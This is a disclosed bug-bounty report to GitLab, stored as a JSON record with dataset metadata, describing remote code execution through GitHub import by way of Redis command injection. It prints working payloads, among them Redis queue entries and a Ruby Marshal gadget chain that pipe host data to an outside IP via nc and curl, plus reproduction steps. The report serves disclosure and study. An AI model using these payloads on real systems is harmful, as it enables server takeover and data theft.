{
  "reported_to": "GitLab",
  "reported_by": "yvvdwf ",
  "title": "RCE via github import",
  "content": "\nHello,\nWhile continuing mining on github import, I found a vulnerability on gitlab.com allowing to execute remotely arbitrary commands.\nGitlab uses Octokit to get data from github.com. Octokit uses Sawyer::Resource to represent results.\nSawyer is a crazy class that converts a hash to an object whose methods are based on the hash's key:\nCode 244 Bytes\n1irb(main):641:0> Sawyer::VERSION\n2=> \"0.8.2\"\n3irb(main):642:0> a = Sawyer::Resource.new( Sawyer::Agent.new(\"\"), to_s: \"example\", length: 1)\n4=> \n5{:to_s=>\"example\", :length=>1}\n6...\n7irb(main):643:0> a.to_s\n8=> \"example\"\n9irb(main):644:0> a.length\n10=> 1\nGitlab uses directly the responded Sawyer object in few functions, such as, the id variable in this function:\nCode 182 Bytes\n1      def already_imported?(object)\n2        id = id_for_already_imported_cache(object)\n3\n4        Gitlab::Cache::Import::Caching.set_includes?(already_imported_cache_key, id)\n5      end\nNormally, id should be a number. However when id is {\"to_s\": {\"bytesize\": 2, \"to_s\": \"1234REDIS_COMMANDS\" }}, we can inject additional redis commands by using bytesize to limit the previous command when it is constructed (although the bytesize is 2 we need to reserve 4 bytes as 2 additional bytes for CLRF):\nCode 371 Bytes\n1      def build_command(args)\n2        command = [nil]\n3\n4        args.each do |i|\n5          if i.is_a? Array\n6            i.each do |j|\n7              j = j.to_s\n8              command << \"$#{j.bytesize}\"\n9              command << j\n10            end\n11          else\n12            i = i.to_s\n13            command << \"$#{i.bytesize}\"\n14            command << i\n15          end\n16        end\nAs we can execute any redis commands, we can escalate to execute any Bash command by using an existing gadget, for example:\nCode 200 Bytes\n1lpush resque:gitlab:queue:system_hook_push \"{\\\"class\\\":\\\"GitlabShellWorker\\\",\\\"args\\\":[\\\"class_eval\\\",\\\"open(\\'| (hostname; ps aux)  | nc 51.75.74.52 11211  \\').read\\\"],\"queue\\\":\\\"system_hook_push\\\"}\"\nI tested this redis command first on my own gitlab instance and it worked.\nI then tested on gitlab.com but got nothing. I tried another by replacing basically nc by curl but no luck:\nCode 218 Bytes\n1 lpush resque:gitlab:queue:system_hook_push \"{\\\"class\\\":\\\"PagesWorker\\\",\\\"args\\\":[\\\"class_eval\\\",\\\"IO.read('|(hostname; ps aux) | curl 51.75.74.52:11211 -X POST --data-binary @-  ')\\\"], \\\"queue\\\":\\\"system_hook_push\\\"}\"\nAlthough the gadget above works well on my local instance but gitlab SaaS which may be protected somehow or used another redis namespace for Sidekiq, even another redis instance. So I used then the basic redis command REPLICAOF 51.75.74.52 11211\\n\\n to test gitlab.com and I got a ping from your redis server to my server nc -vlkp 11211:\n<image_0>\nThis means that I have the full control on the redis. After seeing the pings, I immediately turned off the replication by executing the redis command REPLICAOF no one\\n\\n. No information from your redis server has been replicated to mine as I used nc and I got only the ping messages.\nBy checking on my local instance at /var/opt/gitlab/redis/redis.conf, I see that only keys command is disable. I did not try FLUSHALL to write data to file as it is too dangerous.\nAs gitlab uses redis as a cache storage, so I tried to reach RCE via Marshal.dump method. I tested the following payload on gitlab.com to poison the avatar of my project via the key cache:gitlab:avatar:yvvdwf/xss:16210710:\nCode 588 Bytes\n1\\r\\n*3\\r\\n$3\\r\\nset\\r\\n$39\\r\\ncache:gitlab:avatar:yvvdwf/xss:16210710\\r\\n$347\\r\\n\\u0004\\b[\\bc\\u0015Gem::SpecFetcherc\\u0013Gem::InstallerU:\\u0015Gem::Requirement[\\u0006o:\\u001cGem::Package::TarReader\\u0006:\\b@ioo:\\u0014Net::BufferedIO\\u0007;\\u0007o:#Gem::Package::TarReader::Entry\\u0007:\\n@readi\\u0000:\\f@headerI\\\"\\u0006a\\u0006:\\u0006ET:\\u0012@debug_outputo:\\u0016Net::WriteAdapter\\u0007:\\f@socketo:\\u0014Gem::RequestSet\\u0007:\\n@setso;\\u000e\\u0007;\\u000fm\\u000bKernel:\\u000f@method_id:\\u000bsystem:\\r@git_setI\\\".(hostname; ps aux) | nc 51.75.74.52 11211\\u0006;\\fT;\\u0012:\\fresolve\\r\\n\\r\\n\nAlthough I did not get RCE but it seems working as I got 500 error code when trying to access to my project. And now I cannot access to my project via web interface. I think I should stop testing to avoid any further potential incidences. I did all the tests above on gitlab.com on 16-17 August 2022 from IP 51.75.74.52\n<image_1>\nSteps to reproduce\nThe steps to reproduce should be the same as this one\nThe following steps are to reproduce on a local gitlab instance whose domain is http://gitlab.example.com:\nStep to reproduce\nTo reproduce, we need the following prerequisite:\nA VM/machine to host the dummy server with an public IP though that gitlab.example.com can access to (or you can configure your gitlab instance to allow to access to local networks)\nI created the dummy server using nodejs, so you need to have also nodejs on the machine\nA Gitlab personal access token. Go to http://gitlab.example.com/-/profile/personal_access_tokens?scopes=api to create a new token with within api scope.\nStep 1: run the dummy server\nCopy the attachment file on your machine and decompress it to any folder, e.g., /tmp/dummy-server\nModify the attack payload as you need inside redis_command.txt file, the default value is to execute the command (hostname; ps aux) > /tmp/ahihi:\nCode 180 Bytes\n1 lpush resque:gitlab:queue:system_hook_push \"{\\\"class\\\":\\\"PagesWorker\\\",\\\"args\\\":[\\\"class_eval\\\",\\\"IO.read('|(hostname; ps aux) > /tmp/ahihi ')\\\"], \\\"queue\\\":\\\"system_hook_push\\\"}\"\nGo to /tmp/dummy-server then run this command: node ./index.js YOUR_IP YOUR_PORT in which, you should replace IP and PORT with the one you have. For example, sudo node index.js 51.75.74.52 80\nStep 2: trigger Gitlab import\nOpen a new terminal, then run the following command, in which:\nYOUR_IP and YOUR_PORT are the values in the previous step\nYOUR_GITLAB_TOKEN is the api token you've created in the pre-requirement\nYOUR_GITLAB_USERNAME is the target namespace you want to import the project to. It can be your username, or a group name\nYOUR_IP and YOUR_PORT are the values in the previous step\nYOUR_GITLAB_TOKEN is the api token you've created in the pre-requirement\nYOUR_GITLAB_USERNAME is the target namespace you want to import the project to. It can be your username, or a group name\nCode 413 Bytes\n1curl -kv \"http://gitlab.example.com/api/v4/import/github\" \\\n2  --request POST \\\n3  --header \"content-type: application/json\" \\\n4  --header \"PRIVATE-TOKEN: YOUR_GITLAB_TOKEN\" \\\n5  --data '{\n6    \"personal_access_token\": \"ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\",\n7    \"repo_id\": \"356289002\",\n8    \"target_namespace\": \"YOUR_GITLAB_USERNAME\",\n9    \"new_name\": \"poc-rce\",\n10    \"github_hostname\": \"http://YOUR_IP:YOUR_PORT\"\n11}'\nFor example:\nCode 374 Bytes\n1curl \"http://gitlab.example.com/api/v4/import/github\" \\\n2  --request POST \\\n3  --header \"content-type: application/json\" \\\n4  --header \"PRIVATE-TOKEN: 3LCvKWXVF-Gadcnbxxxx\" \\\n5  --data '{\n6    \"personal_access_token\": \"xxxxx\",\n7    \"repo_id\": \"356289002\",\n8    \"target_namespace\": \"root\",\n9    \"new_name\": \"NEW-NAME-'$(date +%s)'\",\n10    \"github_hostname\": \"http://ns.yvvdwf.me:80\"\n11}'\nView the result in /etc/ahihi\nImpact\nAny one the the ability to call api/v4/import/github endpoint could achieve RCE via a specially crafted responses\n\n",
  "severity": [
    9.9,
    null
  ],
  "bounty": 1000,
  "weaknesses": [
    "OS Command Injection"
  ],
  "screenshots": {
    "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/z6sgzmwezby006npwc9j0ldbjn1u?response-content-disposition=attachment%3B%20filename%3D%22redis_replicaof.png%22%3B%20filename%2A%3DUTF-8%27%27redis_replicaof.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQT4ITYTNW%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T011743Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIC6h%2BrdYXb2SCjM6RglUQZmdJGtnAEp4YtE6frzu5iOmAiEAmEc2%2Bo0J6oLX1vCnRWFGAVbW7lH%2B6aoT233Nps5VBnIquwUI%2Bf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDK%2F1PwnCfCsvULM%2BeSqPBcJ6fpZnxNnO1gFQLrF%2F4yTt3IGOqTr03BGE6%2F5pJY%2Fk6Rl4Mu3bQ1fDPk6K5KUlumLcxSI1Zwz%2FwTUHaHeNQYba2d1%2B8ZOLGhCjfAF4XXnhueAZ7ej%2BY1r23ifUt525NqynE6DhCPR4c7EnJp14LYBHJJpp7W3EnsJeGxPeKOIzwgZYLOE2FwMwg8rursVbjISmeMc7qNnlR0uXS7M8C6hVIxANlM3rWh2kslZpiPopS35xJKpNYX69WWdJ4fSWRYMzglRkwOht7IKgW46gf0rcpO3jxXYBcafvAxrZoTIjSYgOuCAFu%2BWy92kxq8L3djmdOuYBMLa0LoujGB9248wdr2BLsYdvdD0cLe6XhGbkMzDfx0vLF6BoTsGl59rG0e4lVwr6Te2H81DM9ZlPERlzjXTXsfGeDmzHf7SLchHqj4PWImCBAoVO5oKtOhYRho0APNMxvkHA4xB8YQb8hbNqvDCT7nJ97mxGoCObQFU3d%2FOkHWeMoKT5CH%2FQLe0d%2FAnjn4OSj3Ble6%2BCv2LmEBr%2FsOmodDBdQ71jQnqi0mXbbw1mTimS3zADThG2Mjj5tcelm8rBSn6fI96D%2BIIiCJMa8mzYz%2BMVybN9s4%2FQaa2hMyvIbiIwIZUDoOPnNH8DarZ%2FpPkOgyO8jJjuy%2FRH%2FZoUQdAUSARQPpukLHefJDvvHk2VrvYLb%2BYEt3wPCTqAdVynkj6b8EKsj0f9vlAHRI8Z%2BbJYIagix4v67FZoEem9%2F392mdg8Ri7D4JrI290atMQ90ktd4QfHE1hdTlq2WpgMsIrpzgrN%2BJbAnRglh6X%2Bq0MLrTirtRqjS4x9CqQ8WaSi0bzJMoMItxYB0AGCx2u%2F2sUCFLd8dp0C67eDTQgw2%2BCHvwY6sQEtUVhG4aIcJqhsEpdoGtfR3QOgtl%2Fyf2WL%2FXBanc%2FBDE3zYX7shwCfGxHsX%2Fm2Bm4cadboPWoMl5oQzkYPTtuntYVomKFyTBRjwtjPghR7I1%2BvgBW5SGtHeN6%2FSTlu6FVxcSG92%2FvFDnEo3nUJGIUZfTAMQoaa5NpnW82agUdMmewDAvGcWXijVLhn8Mv31YhO3tM%2BCtPlUtKTOOL9gcutQFndEbXSN0kwBdyYsWCUeMo%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=0132dd3f923c4cf6d7cd50e761fd703be5e758fea99549a31f22419de2ed0982",
    "image_1": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/xoox16h9axvyujjvuaz68uysc1x0?response-content-disposition=attachment%3B%20filename%3D%22something_went_wrong.png%22%3B%20filename%2A%3DUTF-8%27%27something_went_wrong.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQT4ITYTNW%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T011743Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEKD%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIC6h%2BrdYXb2SCjM6RglUQZmdJGtnAEp4YtE6frzu5iOmAiEAmEc2%2Bo0J6oLX1vCnRWFGAVbW7lH%2B6aoT233Nps5VBnIquwUI%2Bf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDK%2F1PwnCfCsvULM%2BeSqPBcJ6fpZnxNnO1gFQLrF%2F4yTt3IGOqTr03BGE6%2F5pJY%2Fk6Rl4Mu3bQ1fDPk6K5KUlumLcxSI1Zwz%2FwTUHaHeNQYba2d1%2B8ZOLGhCjfAF4XXnhueAZ7ej%2BY1r23ifUt525NqynE6DhCPR4c7EnJp14LYBHJJpp7W3EnsJeGxPeKOIzwgZYLOE2FwMwg8rursVbjISmeMc7qNnlR0uXS7M8C6hVIxANlM3rWh2kslZpiPopS35xJKpNYX69WWdJ4fSWRYMzglRkwOht7IKgW46gf0rcpO3jxXYBcafvAxrZoTIjSYgOuCAFu%2BWy92kxq8L3djmdOuYBMLa0LoujGB9248wdr2BLsYdvdD0cLe6XhGbkMzDfx0vLF6BoTsGl59rG0e4lVwr6Te2H81DM9ZlPERlzjXTXsfGeDmzHf7SLchHqj4PWImCBAoVO5oKtOhYRho0APNMxvkHA4xB8YQb8hbNqvDCT7nJ97mxGoCObQFU3d%2FOkHWeMoKT5CH%2FQLe0d%2FAnjn4OSj3Ble6%2BCv2LmEBr%2FsOmodDBdQ71jQnqi0mXbbw1mTimS3zADThG2Mjj5tcelm8rBSn6fI96D%2BIIiCJMa8mzYz%2BMVybN9s4%2FQaa2hMyvIbiIwIZUDoOPnNH8DarZ%2FpPkOgyO8jJjuy%2FRH%2FZoUQdAUSARQPpukLHefJDvvHk2VrvYLb%2BYEt3wPCTqAdVynkj6b8EKsj0f9vlAHRI8Z%2BbJYIagix4v67FZoEem9%2F392mdg8Ri7D4JrI290atMQ90ktd4QfHE1hdTlq2WpgMsIrpzgrN%2BJbAnRglh6X%2Bq0MLrTirtRqjS4x9CqQ8WaSi0bzJMoMItxYB0AGCx2u%2F2sUCFLd8dp0C67eDTQgw2%2BCHvwY6sQEtUVhG4aIcJqhsEpdoGtfR3QOgtl%2Fyf2WL%2FXBanc%2FBDE3zYX7shwCfGxHsX%2Fm2Bm4cadboPWoMl5oQzkYPTtuntYVomKFyTBRjwtjPghR7I1%2BvgBW5SGtHeN6%2FSTlu6FVxcSG92%2FvFDnEo3nUJGIUZfTAMQoaa5NpnW82agUdMmewDAvGcWXijVLhn8Mv31YhO3tM%2BCtPlUtKTOOL9gcutQFndEbXSN0kwBdyYsWCUeMo%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1a537b6dc27b9d0b8d6a2b1b89011897a7e5a8c71b55e92bd6cc0fa2c4b7c3b5"
  },
  "disclosed_date": 1668579000,
  "report_url": "https://hackerone.com/reports/1672388",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "HIGH",
  "vuln_category": "API",
  "steps": [
    [
      1,
      "Run a dummy server with node.js to simulate a GitHub API response that includes a specially crafted Sawyer object to manipulate Redis commands."
    ],
    [
      2,
      "Trigger a GitHub import in GitLab by sending a POST request to the /api/v4/import/github endpoint with the crafted response as the GitHub hostname."
    ]
  ],
  "vuln_description": "The vulnerability allows remote code execution (RCE) through a GitHub import feature in GitLab. By crafting a malicious response from a GitHub API simulation, an attacker can manipulate Redis commands via a Sawyer object, leading to arbitrary command execution on the GitLab server.",
  "reason": "The attack involves multiple complex components including manipulating Redis commands through a Sawyer object, understanding GitLab's import process, and crafting a malicious GitHub API response. The interaction between these components is subtle and requires deep knowledge of both GitLab's internal workings and Redis command injection techniques.",
  "new_complexity": "VERY_HIGH",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves exploiting a Redis command injection through GitHub import functionality, which is outside the scope of the described AuthN/AuthZ testing methodology. The methodology focuses on testing user sessions and resource access within the same application context, not on command injection or Redis manipulation.",
    "is_detectable": false
  }
}